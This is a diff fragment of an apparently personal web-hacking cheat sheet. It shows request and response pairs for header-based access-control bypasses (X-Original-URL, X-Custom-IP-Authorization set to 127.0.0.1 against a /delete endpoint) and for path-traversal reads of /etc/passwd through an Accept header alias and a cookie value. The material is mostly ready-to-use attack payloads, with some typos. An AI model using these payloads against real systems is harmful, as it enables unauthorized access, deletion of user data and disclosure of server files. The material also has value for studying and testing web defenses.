@@ -16,3 +16,30 @@ X-Original-URL: /admin
 HTTP/1.1 200 OK
 
 alias lfi="curl -H 'Accept: ../../../../../../../../../etc/passwd{{' "
+
+======================================================================
+How to find authentication bypass vulnerabilities.
+Focus. I Added headers.
+
+Request
+GET /delete?user=test HTTP/1.1
+Response
+HTTP/1.1 401 Unauthorized
+
+Reqeust
+GET /delete?user=test HTTP/1.1
+X-Custom-IP-Authorization: 127.0.0.1
+Response
+HTTP/1.1 302 Found
+
+======================================================================
+How to find local file read vuln based on cookies.
+
+Request
+GET /vulnerable.php HTTP/1.1
+Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
+
+Response
+HTTP/1.1 200 OK 
+...
+Server Apache 2.4 
